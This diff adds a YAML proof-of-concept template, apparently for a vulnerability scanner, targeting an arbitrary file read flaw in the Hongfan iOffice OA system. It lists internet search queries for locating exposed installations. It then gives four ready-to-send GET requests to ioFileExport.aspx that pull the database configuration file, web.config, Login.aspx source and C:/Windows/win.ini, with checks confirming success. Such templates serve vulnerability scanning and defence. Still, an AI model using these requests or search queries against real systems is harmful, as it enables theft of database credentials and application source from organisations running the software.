@@ -1,0 +1,53 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="红帆-ioffice"
+    hunter-query: app.name=="红帆 iOffice"
+    quake-query: app:"ioffice红帆OA协同办公系统"  
+    zoomeye-query: app:"红帆 ioffice"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    
+name: poc-yaml-hongfan-ioffice-ioFileExport.aspx-file-read 
+manual: true
+transport: http
+set:
+    a: randomInt(1000000000, 9000000000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/iODbSet.config&filename=iODbSet.config&ContentType=application/octet-stream
+            headers:
+            body:
+        expression: response.status == 200 && response.body_string.contains("database")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream
+            headers:
+            body:
+        expression: response.status == 200 && response.body_string.contains("DbConfig")
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream
+            headers:
+            body:
+        expression: response.status == 200 && response.body_string.contains("Login.aspx.vb")
+    r3:
+        request:
+            cache: true
+            method: GET
+            path: /iOffice/prg/set/ioCom/ioFileExport.aspx?url=C:/Windows/win.ini
+            headers:
+            body:
+        expression: response.status == 200 && response.body_string.contains("[files]")
+expression: r0() || r1() || r2() || r3()
